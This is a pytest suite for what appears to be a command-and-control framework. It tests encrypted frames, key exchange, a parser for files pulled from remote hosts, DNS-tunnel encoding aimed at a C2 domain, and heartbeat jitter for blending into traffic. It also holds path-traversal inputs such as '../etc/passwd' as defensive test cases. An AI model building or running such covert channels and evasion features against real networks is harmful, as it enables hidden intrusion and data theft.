import os
import re
import sys
import pytest
from cryptography.hazmat.primitives.asymmetric import ed25519

from common import cnc_core, cnc_crypto
from cnc_handler import _parse_file_transfer_payload, _resolve_safe_output_path

PSK = b"test-psk-32-bytes-exactly!!!!!!!!"


@pytest.fixture(autouse=True)
def reset_crypto():
    """Restore default PSK after every test that touches session state."""
    yield
    cnc_crypto.destroy_session_crypto()


# ==============================================================================
# Frame encode / decode
# ==============================================================================

def test_frame_roundtrip():
    frame = cnc_core.encode_frame(
        b"hello world", cnc_core.OPCODE_CMD, cnc_core.CMD_LIST_DIR,
        0xDEADBEEF, 1, True, PSK,
    )
    result = cnc_core.decode_and_verify_frame(frame, PSK)
    assert result is not None
    net_op, app_op, flags, tid, seq, plaintext = result
    assert net_op == cnc_core.OPCODE_CMD
    assert app_op == cnc_core.CMD_LIST_DIR
    assert flags == cnc_core.FLAG_EOF
    assert tid == 0xDEADBEEF
    assert seq == 1
    assert plaintext == b"hello world"


def test_empty_payload_roundtrip():
    frame = cnc_core.encode_frame(
        b"", cnc_core.OPCODE_ACK, cnc_core.CMD_KEEPALIVE, 0, 0, True, PSK,
    )
    result = cnc_core.decode_and_verify_frame(frame, PSK)
    assert result is not None
    assert result[5] == b""


def test_non_eof_flag():
    frame = cnc_core.encode_frame(
        b"chunk", cnc_core.OPCODE_RES, cnc_core.CMD_KEEPALIVE, 1, 1, False, PSK,
    )
    result = cnc_core.decode_and_verify_frame(frame, PSK)
    assert result is not None
    assert result[2] == cnc_core.FLAG_NONE


# ==============================================================================
# HMAC integrity enforcement
# ==============================================================================

def test_tampered_hmac_rejected():
    frame = bytearray(
        cnc_core.encode_frame(b"secret", cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE, 1, 1, True, PSK)
    )
    frame[14] ^= 0xFF  # flip a byte inside the 16-byte HMAC tag
    assert cnc_core.decode_and_verify_frame(bytes(frame), PSK) is None


def test_tampered_ciphertext_rejected():
    frame = bytearray(
        cnc_core.encode_frame(b"secret", cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE, 1, 1, True, PSK)
    )
    frame[-1] ^= 0xFF  # flip a byte in the ciphertext
    assert cnc_core.decode_and_verify_frame(bytes(frame), PSK) is None


def test_wrong_psk_rejected():
    frame = cnc_core.encode_frame(b"data", cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE, 1, 1, True, PSK)
    wrong = b"wrong-psk-32-bytes-exactly!!!!!"
    assert cnc_core.decode_and_verify_frame(frame, wrong) is None


def test_truncated_frame_rejected():
    frame = cnc_core.encode_frame(b"data", cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE, 1, 1, True, PSK)
    assert cnc_core.decode_and_verify_frame(frame[:10], PSK) is None


def test_empty_bytes_rejected():
    assert cnc_core.decode_and_verify_frame(b"", PSK) is None


# ==============================================================================
# Chunking
# ==============================================================================

def test_chunking_reassembles_correctly():
    import common.cnc_core as _core
    saved = _core.max_data_size
    _core.max_data_size = 32
    data = b"X" * 500
    chunks = cnc_core.chunk_binary_payload(data)
    _core.max_data_size = saved
    assert len(chunks) > 1
    assert b"".join(chunks) == data


def test_small_payload_single_chunk():
    chunks = cnc_core.chunk_binary_payload(b"tiny")
    assert len(chunks) == 1


def test_empty_payload_single_empty_chunk():
    chunks = cnc_core.chunk_binary_payload(b"")
    assert chunks == [b""]


# ==============================================================================
# Crypto: ECDH key agreement
# ==============================================================================

def test_ecdh_both_sides_derive_same_key():
    priv_a, pub_a = cnc_crypto.generate_ephemeral_keypair()
    priv_b, pub_b = cnc_crypto.generate_ephemeral_keypair()

    cnc_crypto.derive_and_set_session_key(priv_a, pub_b)
    key_a = cnc_crypto.get_session_psk()

    cnc_crypto.derive_and_set_session_key(priv_b, pub_a)
    key_b = cnc_crypto.get_session_psk()

    assert key_a == key_b
    assert key_a != cnc_crypto.get_handshake_psk()


def test_different_peers_derive_different_keys():
    priv_a, pub_a = cnc_crypto.generate_ephemeral_keypair()
    priv_b, pub_b = cnc_crypto.generate_ephemeral_keypair()
    priv_c, pub_c = cnc_crypto.generate_ephemeral_keypair()

    cnc_crypto.derive_and_set_session_key(priv_a, pub_b)
    key_ab = cnc_crypto.get_session_psk()

    cnc_crypto.derive_and_set_session_key(priv_a, pub_c)
    key_ac = cnc_crypto.get_session_psk()

    assert key_ab != key_ac


# ==============================================================================
# Crypto: Ed25519 sign / verify
# ==============================================================================

def test_ed25519_valid_signature():
    identity_priv = ed25519.Ed25519PrivateKey.generate()
    priv_hex = identity_priv.private_bytes_raw().hex()
    pub_hex = identity_priv.public_key().public_bytes_raw().hex()

    _, eph_pub = cnc_crypto.generate_ephemeral_keypair()
    sig = cnc_crypto.sign_ephemeral_key(priv_hex, eph_pub)
    assert cnc_crypto.verify_ephemeral_key(pub_hex, eph_pub, sig)


def test_ed25519_wrong_signing_key_rejected():
    real_priv = ed25519.Ed25519PrivateKey.generate()
    other_priv = ed25519.Ed25519PrivateKey.generate()
    pub_hex = real_priv.public_key().public_bytes_raw().hex()
    wrong_priv_hex = other_priv.private_bytes_raw().hex()

    _, eph_pub = cnc_crypto.generate_ephemeral_keypair()
    sig = cnc_crypto.sign_ephemeral_key(wrong_priv_hex, eph_pub)
    assert not cnc_crypto.verify_ephemeral_key(pub_hex, eph_pub, sig)


def test_ed25519_tampered_payload_rejected():
    identity_priv = ed25519.Ed25519PrivateKey.generate()
    priv_hex = identity_priv.private_bytes_raw().hex()
    pub_hex = identity_priv.public_key().public_bytes_raw().hex()

    _, eph_pub = cnc_crypto.generate_ephemeral_keypair()
    sig = cnc_crypto.sign_ephemeral_key(priv_hex, eph_pub)

    tampered = bytes([eph_pub[0] ^ 0xFF]) + eph_pub[1:]
    assert not cnc_crypto.verify_ephemeral_key(pub_hex, tampered, sig)


# ==============================================================================
# Crypto: session key zeroization
# ==============================================================================

def test_destroy_resets_to_handshake_psk():
    identity_pub = ed25519.Ed25519PrivateKey.generate().public_key().public_bytes_raw()
    cnc_crypto.init_handshake_psk(identity_pub)
    handshake_psk = cnc_crypto.get_handshake_psk()

    priv, pub = cnc_crypto.generate_ephemeral_keypair()
    cnc_crypto.derive_and_set_session_key(priv, pub)
    assert cnc_crypto.get_session_psk() != handshake_psk

    cnc_crypto.destroy_session_crypto()
    assert cnc_crypto.get_session_psk() == handshake_psk


# ==============================================================================
# File transfer payload parsing
# ==============================================================================

def test_parse_valid_file_transfer():
    payload = b"[File Content Outbox] Source: /home/user/secret.txt\n---\nbinary\x00data"
    result = _parse_file_transfer_payload(payload)
    assert result is not None
    filename, content = result
    assert filename == "secret.txt"
    assert content == b"binary\x00data"


def test_parse_missing_delimiter():
    assert _parse_file_transfer_payload(b"no delimiter here") is None


def test_parse_empty_filename_blocked():
    assert _parse_file_transfer_payload(b"\n---\ncontent") is None


def test_parse_dotdot_filename_blocked():
    payload = b"../etc/passwd\n---\nroot:x:0:0"
    result = _parse_file_transfer_payload(payload)
    assert result is not None
    filename, _ = result
    # os.path.basename strips the traversal — only the last component survives
    assert "/" not in filename and "\\" not in filename


# ==============================================================================
# Path traversal prevention
# ==============================================================================

def test_path_traversal_blocked():
    assert _resolve_safe_output_path("../../../etc/passwd") is None
    assert _resolve_safe_output_path("../../shadow") is None


def test_safe_filename_allowed():
    result = _resolve_safe_output_path("output.txt")
    assert result is not None
    assert result.endswith("output.txt")
    assert "received_files" in result


# ==============================================================================
# DNS transport: QNAME encode / decode roundtrip
# ==============================================================================

def test_dns_qname_roundtrip_small_frame():
    import common.cnc_core as _core
    data = b"\x01\x02\x03\x04"
    qname = _core._frame_to_qname(data).encode('ascii')
    recovered = _core._qname_to_frame(qname)
    assert recovered == data


def test_dns_qname_roundtrip_full_chunk():
    import common.cnc_core as _core
    data = os.urandom(cnc_core.max_data_size)
    qname = _core._frame_to_qname(data).encode('ascii')
    recovered = _core._qname_to_frame(qname)
    assert recovered == data


def test_dns_qname_wrong_domain_returns_none():
    import common.cnc_core as _core
    qname = b"abc.other.domain."
    assert _core._qname_to_frame(qname) is None


def test_dns_qname_labels_within_rfc_limits():
    import common.cnc_core as _core
    data = os.urandom(cnc_core.max_data_size)
    qname = _core._frame_to_qname(data).rstrip('.')
    for label in qname.split('.'):
        assert len(label) <= 63, f"label too long: {label!r}"
    assert len(qname) <= 253


def test_max_data_size_fits_in_dns_name():
    # A full frame (header + max_data_size payload) must survive QNAME encode
    import common.cnc_core as _core
    frame = cnc_core.encode_frame(
        os.urandom(cnc_core.max_data_size),
        cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE,
        1, 1, True, PSK,
    )
    qname = _core._frame_to_qname(frame)
    assert len(qname.rstrip('.')) <= 253


def test_dns_txt_rdata_roundtrip():
    import common.cnc_core as _core
    data = os.urandom(100)
    rdata = _core._frame_to_txt_rdata(data)
    assert rdata[0] == len(rdata) - 1  # valid TXT char-string length prefix
    recovered = _core._txt_rdata_to_frame(rdata)
    assert recovered == data


def test_dns_txt_rdata_roundtrip_max_frame():
    import common.cnc_core as _core
    frame = cnc_core.encode_frame(
        os.urandom(cnc_core.max_data_size),
        cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE,
        1, 1, True, PSK,
    )
    rdata = _core._frame_to_txt_rdata(frame)
    assert rdata[0] == len(rdata) - 1
    recovered = _core._txt_rdata_to_frame(rdata)
    assert recovered == frame


def test_dns_qname_alphabet_alphanumeric():
    """QNAME data labels must only contain [a-z0-9] — no base32-only chars like 2-7."""
    import common.cnc_core as _core
    for _ in range(20):
        data = os.urandom(cnc_core.max_data_size)
        qname = _core._frame_to_qname(data)
        suffix = '.' + _core._c2_domain + '.'
        data_part = qname[: -len(suffix)]
        for label in data_part.split('.'):
            assert re.fullmatch(r'[a-z0-9]+', label), f"Non-alphanumeric chars in label: {label!r}"


def test_dns_response_structure():
    """Response must echo the QNAME in its Question section, carry a TXT answer,
    and include a SOA authority record — validators on resolvers check this."""
    import common.cnc_core as _core
    from scapy.layers.dns import DNS
    data = os.urandom(32)
    qname_str = _core._frame_to_qname(data)
    qname_bytes = qname_str.encode('ascii')
    frame = cnc_core.encode_frame(
        data, cnc_core.OPCODE_CMD, cnc_core.CMD_KEEPALIVE, 1, 1, True, PSK,
    )
    resp = _core.build_dns_response('1.2.3.4', 12345, qname_bytes, frame, txid=0xABCD)
    dns = resp[DNS]
    assert dns.qr == 1 and dns.aa == 1
    assert dns.qdcount == 1 and dns.ancount == 1 and dns.nscount == 1
    assert dns.qd[0].qname == qname_bytes       # Question echoes query QNAME
    assert dns.an[0].rrname == qname_bytes      # Answer is for the same name
    assert dns.an[0].type == 16                 # TXT
    assert 30 <= dns.an[0].ttl <= 300           # randomized TTL in expected range
    assert dns.ns[0].type == 6                  # SOA in authority


# ==============================================================================
# Blending: log-normal heartbeat jitter
# ==============================================================================

def test_heartbeat_interval_above_minimum():
    for _ in range(200):
        assert cnc_core.get_heartbeat_interval() >= 1.0


def test_heartbeat_interval_median_near_configured():
    import statistics
    samples = [cnc_core.get_heartbeat_interval() for _ in range(1000)]
    assert abs(statistics.median(samples) - 10.0) < 1.5
